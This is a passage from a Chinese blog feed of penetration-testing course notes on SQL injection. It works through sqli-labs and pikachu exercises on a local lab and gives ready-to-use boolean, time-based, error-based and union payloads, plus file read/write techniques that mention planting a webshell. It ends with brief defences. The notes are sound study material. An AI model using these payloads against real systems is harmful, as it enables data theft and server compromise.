        <content type="html"><![CDATA[<pre><code>SQL注入之加解密注入</code></pre><p>Base64是网络上最常见的用于传输8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683" target="_blank">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457" target="_blank">二进制</a>数据的方法。</p><p>Less-21关 Cookie加密注入：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/0afa9058e7b34fcf84a2e61b79189c91.png" alt="image.png" class="align-none"></p><p>通过Burpsuite抓包：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/d02d59f88d1a483cbc362e968185ad67.png" alt="image.png" class="align-none"></p><p>进行Base64解密：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/2bd5296c6df64f0782ded364586544d1.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.4SQL注入之布尔盲注</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.4sql-zhu-ru-zhi-bu-er-mang-zhu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.4sql-zhu-ru-zhi-bu-er-mang-zhu/</url>
      
        <content type="html"><![CDATA[<pre><code>SQL注入之布尔盲注</code></pre><h3>1.什么是布尔盲注？</h3><p>Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。</p><p>返回False时：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/a9e2622c9ab4426eb95db68e9bc76ae2.png" alt="image.png" class="align-none"></p><p>返回True时：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/61d6681f946648d39f5c46ce47d0285a.png" alt="image.png" class="align-none"></p><h3>2.如何进行布尔盲注？</h3><p>注入流程：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/65e35005c1d24fb085b94bf42339e5df.png" alt="image.png" class="align-none"></p><h3>3.靶场案例演示：</h3><p>1.<strong> 猜解数据库的名字</strong></p><p>`http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))&gt;115--+ 非正常</p><p><a href="http://127.0.0.1/sql/Less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/Less-5/index.php?id=1</a>' and ascii(mid(database(),1,1))&gt;116--+ 非正常</p><p><a href="http://127.0.0.1/sql/Less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/Less-5/index.php?id=1</a>' and ascii(mid(database(),1,1))=115--+ 正常<br><a href="http://127.0.0.1/sql/less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/less-5/index.php?id=1</a>' and ascii(mid(database(),2,1))=101--+ 正常<br><a href="http://127.0.0.1/sql/less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/less-5/index.php?id=1</a>' and ascii(mid(database(),3,1))=99--+  正常`</p><p>如此就得到了</p><p>第一个字符的ASCII码为115解码出来为“s”</p><p>第二个字符的ASCII码为101解码出来为“e”</p><p>第二个字符的ASCII码为99解码出来为“c”</p><p>依次类推出数据库的名字为“security”</p><p>2.<strong>猜解表明名</strong></p><pre><code>http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ 正确http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+ 正确</code></pre><p>注：select下的limit是第几个表。</p><p>substr下的是截取的表内容。</p><p>当前库下（注入点连接的数据库）第一个表ASCII码为<strong>114  解码为r</strong></p><p>当前库下（注入点连接的数据库）第一个表ASCII码为<strong>101  解码为e</strong></p><p><strong>当前库下（注入点连接的数据库）第一个表ASCII码为....</strong>  解码为<strong> referer</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/02a961e381134335aec168900f9974ad.png" alt="image.png" class="align-none"></p><h3>总结归纳：</h3><p>盲注分为三种：</p><p><strong>1.<a href="http://www.cnblogs.com/xishaonian/p/6103505.html%20" target="_blank">布尔型盲注</a>：</strong> 根据页面返回的真假来判断的即为<strong>布尔型盲注</strong></p><p><strong>2.<a href="9ed06a9fbab342f27802e5d31a0f06d7" target="_blank">时间型盲注</a>：</strong> 根据页面返回的时间来判断的即为<strong>时间型盲注</strong></p><p><strong>3.报错型盲注</strong> ：根据页面返回的对错来判断的即为<strong>报错型盲注</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.3SQL注入之延时注入</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.3sql-zhu-ru-zhi-yan-shi-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.3sql-zhu-ru-zhi-yan-shi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>基于时间的SQL盲注 - 延时注入</h1><p><strong>知识储备：</strong></p><p>sleep（）：                                     <em>Sleep</em> 函数可以使计算机程序（进程，任务或线程）进入休眠</p><p>if（）：                                           <em>i f</em> 是 计算机编程语言一个关键字，分支结构的一种</p><p>mid(a,b,c):                                      从b开始，截取a字符串的c位</p><p>substr(a,b,c)：                                从b开始，截取字符串a的c长度</p><p>left(database(),1),database() :         left(a,b)从左侧截取a的前b位</p><p>length(database())=8 ：                 判断长度</p><p>ord=ascii ascii(x)=100：                判断x的ascii值是否为100</p><p>在不使用sleep下查询数据所需要的时间：0.03秒</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/86721e1e6625491b89f6de0fd7c8189f.png" alt="image.png" class="align-none"></p><p>使用sleep可以使查询数据休眠指定时间</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f3fd6f2e63db44c8adb5d1f84c7150e6.png" alt="image.png" class="align-none"></p><p>if（a,b,c）：可以理解在java程序中的三目运算符，a条件成立 执行b, 条件不成立，执行c</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/3705cd9bfb4e4b10ae8a8f81712c8c09.png" alt="image.png" class="align-none">的</p><p>使用if与sleep结合使用：<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c7279f60359d4778aa443db53705b252.png" alt="image.png" class="align-none"></p><p>达到延时数据显示，从而通过数据显示的时间判断数据对错!</p><p>使用靶场less-2来实现延时注入：</p><p>ocalhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(database()=%27test%27,0,5))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c48403abd1ff4026a2a9485290321fa7.png" alt="image.png" class="align-none"></p><p>可以通过length（）来判断数据库的长度</p><p><a href="http://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(length(database()" target="_blank">http://localhost/sqli-labs-master/Less-2/index.php?id=1 and sleep(if(length(database()</a>)=8,8,0))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/b1de1ad243a04e6d952ca86f0b394a90.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/4f36b025da8041809ae05b5948ae6ec3.png" alt="image.png" class="align-none"></p><p>mid（）使用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/44847cfea0264c508384528490bf677e.png" alt="image.png" class="align-none"></p><p>substr()函数<br>Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>string substring(string, start, length)<br>string substr(string, start, length)<br>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>substr()函数使用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f10a155fd6cf45a2a0d88159c51dc414.png" alt="image.png" class="align-none"></p><p>Left()函数</p><p>Left()得到字符串左部指定个数的字符</p><p>Left ( string, n ) string为要截取的字符串，n为长度。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/5fc2512b47444fd4a531725e7503a08f.png" alt="image.png" class="align-none"></p><p>通过以上函数可以来判断数据信息：</p><p><a href="http://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(mid(database(),1,1" target="_blank">http://localhost/sqli-labs-master/Less-2/index.php?id=1 and sleep(if(mid(database(),1,1</a>)=%27t%27,0,5))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/8f63d5b742564ae18fda98666bc7df98.png" alt="image.png" class="align-none"></p><p>推荐使用ASCII码</p><p>1.防止引号 ‘  “ 转义</p><p>2.方便以后工具的使用</p><p>使用ascii函数（）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/6eea9e36b99d426184f938a0d29d5c85.png" alt="image.png" class="align-none"></p><p>结合场景使用：</p><p>select * from t1 where id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=120,sleep(3),0);</p><p>select * from t1 where id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=116,sleep(2),0);</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.1_2 SQL注入之查询方式</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.1-2-sql-zhu-ru-zhi-cha-xun-fang-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.1-2-sql-zhu-ru-zhi-cha-xun-fang-shi/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之查询方式</h1><p>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显得原因可能时SQL语句查询方式问题导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中SQL语句可以更好的选择对应的注入语句。</p><p>select 查询数据</p><p>例如：在网站应用中进行数据显示查询操作</p><pre><code>select * from user where id=$id</code></pre><h2>delete 删除数据</h2><p>例如：后台管理里面删除文章删除用户等操作</p><pre><code>delete from user where id=$id</code></pre><h2>insert 插入数据</h2><p>例如：在网站应用中进行用户注册添加操作</p><pre><code>inser into user （id,name,pass） values(1,'zhangsan','1234')</code></pre><h2>update 更新数据</h2><p>例如：后台中心数据同步或者缓存操作</p><pre><code>update user set pwd='p' where id=1</code></pre><h1>SQL注入 报错盲注</h1><p>盲注就是在注入的过程中，获取的数据不能显示到前端页面，此时，我们需要利用一些方法进行判断或者尝试，我们称之为盲注。我们可以知道盲注分为以下三类：</p><h3>1.基于布尔的SQL盲注 - 逻辑判断</h3><p>regexp like ascii left ord mid</p><h3>2.基于时间的SQL盲注 - 延时判断</h3><p>if sleep</p><h3>3.基于报错的SQL盲注 - 报错回显（强制性报错   ）</h3><p>函数解析：</p><p><strong>updatexml():从目标XML中更改包含所查询值的字符串</strong></p><p>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC</p><p>第二个参数：XPath_string(Xpath格式字符串)</p><p>第三个参数：new_value,String格式，替换查找到的符合条件的数据</p><p>updatexml（XML_document,XPath_String,new_value）;</p><p>'or updatexml(1,concat(0x7e,database()),0)or'</p><p><strong>extractvalue():从目标XML中返回包含所查询值的字符串</strong></p><p>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC</p><p>第二个参数：XPath_String (Xpath格式字符串)</p><p>extractvalue(XML_document,XPath_String)</p><p>' or extractvalue(1,concat(0x7e,database())) or'</p><p>' union select 1,extractvalue(1,concat(0x7e,(select version())))%23</p><p>函数应用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/54b8dd46c3ae496297e6610d3d8530d2.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/c6b4a764335541d290e8c59fb9a1daf2.png" alt="image.png" class="align-none"></p><p>floor()向下取整  floor（10.5）  =  10<br>rand（）随机数 0 ~ 1之间<br>count（*）函数返回表的记录数。<br>concat函数：将多个字符串连接成一个字符串<br>group_by 根据by对数据按照哪个字段、进行分组，或者是哪几个字段进行分组（去重）。<br>会建立一张临时表<br>注意：多个字段分组要使用某个列的聚合函数 cout sum等</p><p>pikachu insert</p><p>username=x' or (select 1 from (select count(*),concat((select))</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.3SQL注入靶场案例练习</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.3sql-zhu-ru-ba-chang-an-li-lian-xi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.3sql-zhu-ru-ba-chang-an-li-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入靶场案例练习</h1><h3>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/248050e80cb94ba4819ece5c9a45072d.png" alt="image.png" class="align-none"></p><p><strong>用burpsuit，抓包修改参数</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5a2399e3e7a0467abd0dab8e36ad9550.png" alt="image.png" class="align-none"></p><p>联合查询union select测试payload</p><p>uname=admin' union select 1,2  --+&amp;passwd=admin&amp;submit=Submit</p><p>爆库payload</p><p>uname=admin' union select 1,database() --+&amp;passwd=admin&amp;submit=Submit</p><h3><strong>Less-20</strong> POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</h3><p>单引号，报错型，cookie型注入。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5f681aa84f7144c5aa6471c997b61896.png" alt="image.png" class="align-none"></p><p>存在魔术引号</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/7970543bbc6a4225a7479a1e73d412c1.png" alt="image.png" class="align-none"></p><p>直接cookie注入，进行绕过</p><p>Cookie: uname=-admin' union select 1,2,database()--+</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/4240a5acf9ed49ac8326cdd95dc252d7.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.2SQL注入之提交方式</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.2sql-zhu-ru-zhi-ti-jiao-fang-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.2sql-zhu-ru-zhi-ti-jiao-fang-shi/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之数据提交方式</h1><h3>GET方式注入</h3><p>get注入方式比较常见，主要是通过url中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入</p><h3>POST方式注入</h3><p>post提交方式主要适用于表单的提交，用于登录框的注入</p><p>方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示</p><h3>Request方式注入</h3><p>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br></p><div data-type="math" data-display="inline" data-text="_REQUEST%EF%BC%88%E8%8E%B7%E5%8F%96GET%2FPOST%2FCOOKIE%EF%BC%89COOKIE%E5%9C%A8%E6%96%B0%E7%89%88%E6%9C%AC%E5%B7%B2%E7%BB%8F%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E4%BA%86%0A"></div>_POST（获取POST传参）<br><div data-type="math" data-display="inline" data-text="_GET%EF%BC%88%E8%8E%B7%E5%8F%96GET%E4%BC%A0%E5%8F%82%EF%BC%89%0A"></div>_COOKIE（获取COOKIE传参）<br>$_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）<p></p><h3>HTTP头注入</h3><p>什么是Header头？</p><p>通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机响应消息。 这两种类型的消息有一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。 HTTP的头域包括通用头，请求头，响应头和实体头四个部分</p><h3>什么是Header头部注入？</h3><p>header注入，该注入是指利用后端验证客户端信息（比如常用的cookie验证）或者通过header中获取客户端的一些信息（比如User-Agent用户代理等其他header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有经过相对应的信息处理所以构成了sql注入。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.1SQL注入之数据类型</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.1sql-zhu-ru-zhi-shu-ju-lei-xing/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.1sql-zhu-ru-zhi-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之数据类型</h1><h3>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p><h3>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p><h3>(4) xx型注入点</h3><p>其他型：也就是由于SQL语句拼接方式不同，在SQL中的实际语句为：，其本质为（xx') or 1=1 # ）</p><p>常见的闭合符号：'     ''    %     (      {</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/sqli-labs-tong-guan/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/sqli-labs-tong-guan/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.yuque.com/attachments/yuque/0/2022/pdf/29430497/1668427767198-b8ded1ca-68e4-413a-a428-16480377bddf.pdf">sqli-labs通关2.0版-学员张坤贡献.pdf</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.5 SQL注入之文件读写</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.5-sql-zhu-ru-zhi-wen-jian-du-xie/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.5-sql-zhu-ru-zhi-wen-jian-du-xie/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之文件读写</h1><h4>文件读写注入的原理</h4><p>就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。</p><h4>文件读写注入的条件</h4><p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限</p><p><strong>secure_file_priv选项</strong></p><pre><code>linuxcat  etc/conf<p>win<br>www/mysql / my.ini</p></code><p><code></code></p></pre><p></p><p>show global variables like '%secure%'  查看mysql全局变量的配置</p><p>1、读写文件需要 <code>secure_file_priv</code>权限</p><p><strong><code>secure_file_priv=</code></strong></p><p>代表对文件读写没有限制</p><p><code>secure_file_priv=NULL</code></p><p>代表不能进行文件读写</p><p><code>secure_file_priv=d:/phpstudy/mysql/data</code></p><p>代表只能对该路径下文件进行读写</p><p>2、知道网站绝对路径</p><p>Windows常见：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/52b8185c15804b098e5832e56952f9d5.png" alt="image.png" class="align-none"></p><p>Linux常见：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/c22c368cda784e5ebb911ff0bbd0fa99.png" alt="image.png" class="align-none"></p><p>路径获取常见方式：</p><p>报错显示，遗留文件，漏洞报错，平台配置文件等</p><h4>读取文件</h4><p>使用函数：<code>load_file()</code></p><p>后面的路径可以是单引号，0x，char转换的字符。</p><p>注意：路径中斜杠是/不是\。</p><p>一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置...</p><h4>写入文件</h4><p>使用函数：<code>Into Outfile</code>（能写入多行，按格式输出）和 <code>into Dumpfile</code>（只能写入一行且没有输出格式）</p><p>outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径</p><h1>2.6 SQL注入之基础防御</h1><h3>魔术引号</h3><p>魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。<br>最好在编码时不要转义而在运行时根据需要而转义。</p><p>魔术引号：<br>在php.ini文件内找到</p><pre><code>magic_quotes_gpc = On 开启<p>将其改为</p></code><p><code>magic_quotes_gpc = Off 关闭 </code></p></pre><p></p><h3>内置函数</h3><p>做数据类型的过滤</p><p>is_int()等</p><p>addslashes()</p><p>mysql_real_escape_string()</p><p>mysql_escape_string()</p><h3>自定义关键字</h3><p>str_replace()</p><p>其他安全防护软件 WAF ......</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.4 SQL注入之高权限注入下</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.4-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-xia/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.4-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-xia/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之高权限注入</h1><p>1.注入流程与上节实例相同</p><h4>查询所有数据库名称</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/fdc981b9a55d426f8ac014bb61d6356f.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata</code></pre><h4>查询数据库对应的表名</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/5fd74715c4a24cb8bcebec4a7778a0f1.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x74657374</code></pre><h4>查询表名对应的字段名</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/8cbb187549814a32afc2cb0a82b7765b.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7431</code></pre><h4>查询数据</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/1b9dc7926a544a1197a7f93a5be493d8.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,name,pass%20from%20test.t1</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.3 SQL注入之高权限注入上</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.3-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-shang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.3-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-shang/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之高权限注入</h1><p>在数据库中区分有数据库系统用户与数据库普通用户,二者的划分主要体现在对一些高级函数与资源表的访问权限上。直白一些就是高权限系统用户拥有整个数据库的操作权限,而普通用户只拥有部分已配置的权限。</p><p>网站在创建的时候会调用数据库链接,会区分系统用户链接与普通用户链接;当多个网站存在一个数据库的时候,root就拥有最高权限可以对多个网站进行管辖,普通用户仅拥有当前网站和配置的部分权限。所以当我们获取到普通用户权限时,我们只拥有单个数据库权限,甚至文件读写失败;取得高权限用户权限，不仅可以查看所有数据库,还可以对服务器文件进行读写操作。</p><h3>多个网站共享mysql服务器</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/d7033b4a97df430fa52b609e39dff24e.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/2e40fafad1f84f6f92cc48a4702e3296.png" alt="image.png" class="align-none"></p><h3>MySQL 权限介绍</h3><p>mysql中存在4个控制权限的表，分别为user表，db表，tables_priv表，columns_priv表，<br>我当前的版本mysql 5.7.22 。</p><pre><code>select * from user where user='root' and host='localhost'\G;<pre><code>mysql权限表的验证过程为：先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。通过身份认证后，进行权限分配，按照user，db，tables_priv，columns_priv的顺序进行验证。即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。</code></pre><p>2.1 